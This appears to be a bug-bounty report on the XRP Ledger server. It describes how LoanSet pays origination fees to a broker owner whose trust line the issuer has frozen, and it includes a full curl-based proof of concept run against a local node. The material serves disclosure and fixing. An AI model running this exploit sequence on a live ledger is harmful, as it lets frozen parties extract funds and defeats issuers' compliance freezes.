# Title
LoanSet origination fees ignore issuer freeze, letting frozen broker owners siphon fees from new loans

# Description

## Brief/Intro
`LoanSet` pays broker origination fees even when the issuer has frozen the broker owner’s trust line. Quarantined brokers can thus continue extracting fees from new loans, draining first-loss capital and undermining issuer freeze controls.

## Vulnerability Details
- `LoanSet::preclaim` calls `checkDeepFrozen` on the broker owner but never invokes `checkFreeze`, so issuer freeze flags (`lsfLowFreeze`/`lsfHighFreeze`) are ignored (*) src/xrpld/app/tx/detail/LoanSet.cpp, lines 292-318 *).
- In `LoanSet::doApply`, when `LoanOriginationFee` is present, the code uses `accountSendMulti` to pay both the borrower and the owner without re-validating freeze state (*) same file, lines 520-563 *).
- The ledger helper (`accountSendMulti`, `rippleCreditIOU`) assumes the caller already enforced freeze restrictions. Since `LoanSet` skipped `checkFreeze`, the IOU transfer succeeds even when the issuer froze the owner (*) src/libxrpl/ledger/View.cpp, lines 1908-2153 *).
- Expected behaviour: issuer freezes should block fee payouts to frozen owners or redirect funds back into cover. Actual behaviour: the transaction returns `tesSUCCESS` and credits the frozen owner’s trust line with the origination fee.

## Impact Details
- Frozen broker owners can collect origination fees, siphoning funds that should strengthen first-loss capital.
- Issuer compliance controls are rendered ineffective because freezes no longer stop value extraction.
- In-scope impacts satisfied: `Drainage and/or stealing of funds from ledger objects (vault, first loss capital)` and `Direct loss of funds`.

## References
- `src/xrpld/app/tx/detail/LoanSet.cpp`
- `src/libxrpl/ledger/View.cpp`

# Proof of Concept

1. **Create deterministic accounts** for issuer, broker owner, and borrower:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"issuer freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"broker freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"borrower freeze demo"}]}'
   ```
2. **Fund each account** from genesis so they can pay transaction fees:
   ```sh
   for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
     curl -s -X POST http://127.0.0.1:5005 -d "{\
       \"method\":\"submit\",\
       \"params\":[{\
         \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",\
         \"tx_json\":{\
           \"TransactionType\":\"Payment\",\
           \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",\
           \"Destination\":\"$acct\",\
           \"Amount\":\"1000000000\"\
         }\
       }]\
     }" | jq '.result.engine_result'
   done
   ```
3. **Set up trust lines and fund the broker with IOUs:**
   ```sh
   # Broker trust line to issuer IOU
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BROKER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         },
         "Flags":262144
       }
     }]
   }' | jq '.result.engine_result'

   # Borrower trust line
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BORROWER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BORROWER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         }
       }
     }]
   }' | jq '.result.engine_result'

   # Issuer supplies IOUs to broker owner
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"Payment",
         "Account":"<ISSUER_ACCOUNT>",
         "Destination":"<BROKER_ACCOUNT>",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"5000000"
         },
         "Flags":131072
       }
     }]
   }' | jq '.result.engine_result'
   ```
4. **Create the vault, loan broker, and deposit cover:**
   ```sh
   VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"VaultCreate",
         "Account":"<BROKER_ACCOUNT>",
         "Asset":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>"
         },
         "Scale":6
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$VAULT_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex')

   BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerSet",
         "Account":"<BROKER_ACCOUNT>",
         "VaultID":"'"$VAULT_ID"'",
         "CoverRateMinimum":1
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   BROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$BROKER_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker").CreatedNode.LedgerIndex')

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverDeposit",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```
5. **Freeze the broker owner’s trust line** and confirm it is set:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<ISSUER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<BROKER_ACCOUNT>",
           "value":"0"
         },
         "Flags":1048576
       }
     }]
   }' | jq '.result.engine_result'

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }' | jq '.result.lines[0].freeze'
   ```
   The last command returns `true`, proving the freeze flag is active.

6. **Originate a loan that includes an origination fee:**
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanSet",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'",
         "Counterparty":"<BORROWER_ACCOUNT>",
         "PrincipalRequested":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"100000000"
         },
         "PaymentInterval":2419200,
         "PaymentTotal":12,
         "LoanOriginationFee":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```
   Result: `tesSUCCESS` despite the issuer freeze.

7. **Observe the fee payout**
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }' | jq '.result.lines[0].balance'
   ```
   The frozen trust line balance increases by `1000`, demonstrating that the fee payout bypassed issuer freeze controls.
